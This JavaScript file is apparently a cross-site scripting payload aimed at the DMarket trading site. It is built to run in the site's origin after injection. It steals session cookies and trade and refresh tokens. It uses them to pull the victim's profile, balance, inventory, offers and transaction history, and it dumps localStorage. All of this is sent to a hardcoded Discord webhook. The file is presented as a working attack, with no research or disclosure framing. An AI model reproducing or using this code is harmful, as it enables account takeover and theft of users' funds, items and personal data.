// DMarket XSS Payload - External Loader
// This file gets loaded via: document.createElement('script') from onerror handler
// Runs in dmarket.com context with full cookie access

(function() {
    var WEBHOOK = 'https://discord.com/api/webhooks/1526292961602703580/nRtqJ9K_5Fw0LvsfOhoAPH7_IybzCQIY4FFHaTXitSoGlxGlWyZ85d70mGwKY2YcFbTa';

    function exfil(tag, data) {
        var body = JSON.stringify({content: '**' + tag + '**\n' + data});
        fetch(WEBHOOK, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: body
        }).catch(function(){});
    }

    // 1. Grab all cookies immediately
    var cookies = document.cookie;
    exfil('COOKIES', cookies);

    // Extract tokens
    var token = (cookies.match(/dm-trade-token=([^;]+)/) || [])[1] || '';
    var refreshToken = (cookies.match(/dm-trade-refresh-token=([^;]+)/) || [])[1] || '';
    var userId = (cookies.match(/dm-trade-userId=([^;]+)/) || [])[1] || '';

    // 2. Fetch user profile
    setTimeout(function() {
        fetch('/marketplace-api/v1/sign-in', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({Email: 'x', Password: 'x'})
        }).catch(function(){});

        // Use the token directly as Authorization header
        fetch('https://api.dmarket.com/account/v1/user', {
            headers: {'Authorization': token}
        }).then(function(r) {
            return r.text();
        }).then(function(profile) {
            exfil('PROFILE', profile.substring(0, 1800));
        }).catch(function(e) {
            exfil('PROFILE_ERROR', e.toString());
        });
    }, 200);

    // 3. Fetch balance
    setTimeout(function() {
        fetch('https://api.dmarket.com/account/v1/balance', {
            headers: {'Authorization': token}
        }).then(function(r) {
            return r.text();
        }).then(function(balance) {
            exfil('BALANCE', balance.substring(0, 500));
        }).catch(function(){});
    }, 400);

    // 4. Fetch inventory
    setTimeout(function() {
        fetch('https://api.dmarket.com/marketplace-api/v2/user/inventory?gameId=a8db&limit=100', {
            headers: {'Authorization': token}
        }).then(function(r) {
            return r.text();
        }).then(function(inv) {
            exfil('INVENTORY', inv.substring(0, 1800));
        }).catch(function(){});
    }, 600);

    // 5. Fetch active offers
    setTimeout(function() {
        fetch('https://api.dmarket.com/marketplace-api/v2/user/offers?gameId=a8db&limit=100', {
            headers: {'Authorization': token}
        }).then(function(r) {
            return r.text();
        }).then(function(offers) {
            exfil('OFFERS', offers.substring(0, 1800));
        }).catch(function(){});
    }, 800);

    // 6. Fetch closed offers (transaction history)
    setTimeout(function() {
        fetch('https://api.dmarket.com/marketplace-api/v1/user-offers/closed?Limit=20', {
            headers: {'Authorization': token}
        }).then(function(r) {
            return r.text();
        }).then(function(history) {
            exfil('HISTORY', history.substring(0, 1800));
        }).catch(function(){});
    }, 1000);

    // 7. If we got a refresh token, try to get fresh access token
    if (refreshToken) {
        setTimeout(function() {
            fetch('https://api.dmarket.com/marketplace-api/v1/refresh-token', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({RefreshToken: refreshToken})
            }).then(function(r) {
                return r.text();
            }).then(function(tokens) {
                exfil('REFRESH_RESULT', tokens.substring(0, 1000));
            }).catch(function(){});
        }, 1200);
    }

    // 8. localStorage extraction (may contain cached data)
    try {
        var storage = {};
        for (var i = 0; i < localStorage.length; i++) {
            var key = localStorage.key(i);
            var val = localStorage.getItem(key);
            if (val && val.length < 500) {
                storage[key] = val;
            }
        }
        exfil('LOCALSTORAGE', JSON.stringify(storage).substring(0, 1800));
    } catch(e) {}
})();
